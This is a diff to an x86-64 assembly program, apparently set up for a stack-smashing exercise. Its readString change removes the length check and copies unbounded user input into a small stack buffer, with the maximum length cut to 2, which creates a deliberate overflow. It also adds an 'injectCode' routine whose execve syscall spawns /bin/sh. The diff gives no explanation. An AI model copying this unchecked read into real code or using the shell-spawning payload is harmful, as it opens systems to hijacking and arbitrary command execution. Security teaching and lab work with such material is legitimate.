@@ -55,31 +55,13 @@ _start:
 ; -----
 ; Display read string message
     mov     rdi, inLine
-    mov     rsi, 20
+    mov     rsi, 2
     call    readString
-
-; -----
-; Store the length of string
-    mov     edi, eax
-    mov     rsi, lenStr
-    call    int2str
 
     mov     rdi, outputMesg
     call    printString
 
-
     mov     rdi, inLine
-    call    printString
-
-; -----
-; Output the legnth of output text
-    mov     rdi, newLine
-    call    printString
-
-    mov     rdi, lenMesg
-    call    printString
-
-    mov     rdi, lenStr
     call    printString
 
     mov     rdi, newLine
@@ -113,16 +95,20 @@ readString:
     ; prologgue
     push    rbp
     mov     rbp, rsp
-    sub     rsp
+    dec     rsp
+    sub     rsp, rsi
     push    rbx
     push    r12
-    
+    push    r13
 ; -----
 ; Read characters from user (one at a time)
-    mov     rbx, rdi
     mov     r12, 0
     mov     r9, rsi     ; store the maximum length
     dec     r9          ; exclude the NULL character
+    mov     r13, rdi
+    neg     rsi
+    dec     rsi
+    lea     rbx, byte [rbp+rsi]
 
 readCharacters:
     mov     rax, SYS_read
@@ -135,29 +121,31 @@ readCharacters:
     cmp     al, LF
     je      readDone
 
-
-    ; If number character already reads higher than len, 
-    ; then not write in buffer
+    mov     byte [rbx+r12], al
     inc     r12
-    cmp     r12, r9         
-    jae     readCharacters
-
-
-    mov     byte [rbx], al
-    inc     rbx
-
     jmp     readCharacters
 
 readDone:
-    mov     byte [rbx], NULL
+    mov     byte [rbx+r12], NULL
+    mov     r10, 0
     cmp     r12, r9
     jae     maxLen
     mov     rax, r12
-    jmp     prtDone
+    mov     rcx, r12
+    jmp     copyStr
+
 maxLen:
     mov     rax, r9
+    mov     rcx, r9
+copyStr:
+    mov     r11b, byte [rbx+r10]
+    mov     byte [r13+r10], r11b
+    inc     r10
+    loop    copyStr
+    mov     byte [r13+r10], NULL
 readStringDone:
     ; prologue
+    pop     r13
     pop     r12
     pop     rbx
     mov     rsp, rbp
@@ -215,78 +203,15 @@ prtDone:
 ; ************************************************
 
 ; ************************************************
-; Simple function to convert an integer to ASCII string
-; -----
-; -----
-; HLL call:
-;   int2str(num, *str)
-; -----
-; Arguments:
-;   num, dword value - edi
-;   str, address - rsi
-; ************************************************
-global int2str
-int2str:
-    ; prologue
-    push    rbp
-    mov     rbp, rsp
-    ; Allocate the space for dword local variable
-    sub     rsp, 1
-    push    rbx  
-; -----
-; Part A - Sign extraction
-    mov     byte [rbp-1], 0
-    cmp     edi, 0
-    jge     division
-    ; Set the local variable to 1 if number is negative
-    mov     byte [rbp-1], 1
-
-; Part B - Successive division
-division:
-    mov     eax, edi
-    mov     rcx, 0
-    mov     rbx, 10
-
-divideLoop:
-    ; divide number by 10
-    cdq
-    idiv    ebx
-    ; push remainder to the stack
-    push    rdx
-    ; store the number of digit to rcx
-    inc     rcx
-    ; Check if the quotient is 0 or not
-    cmp     eax, 0
-    jne     divideLoop
-
-; -----
-; Part C - Convert remainders and store
-    mov     rdi, 0
-
-addSign:      
-    cmp     byte [rbp-1], 0
-; Add minus sign character if negative
-    je      popLoop
-    mov     byte [rsi+rdi], '-'
-    inc     rdi
-
-popLoop:
-    pop     rax
-    ; If number is negative, only take the absolute value
-    cmp     byte [rbp-1], 0
-    je      addAbs
-    neg     al
-addAbs:
-    add     al, '0'
-    mov     byte [rsi+rdi], al
-    inc     rdi
-    loop    popLoop
-    ; Add NULL at the end of string
-    mov     byte [rsi+rdi+1], NULL
-
-    ; epilogue
-    pop     rbx
-    mov     rsp, rbp
-    pop     rbp
+; Injection function to open console
+global injectCode
+injectCode:
+    xor     rax, rax
+    push    rax
+    mov     rbx, 0x68732f6e69622f2f
+    push    rbx
+    mov     al, 59
+    mov     rdi, rsp
+    syscall
 ret
-; *****************************************
+; ************************************************
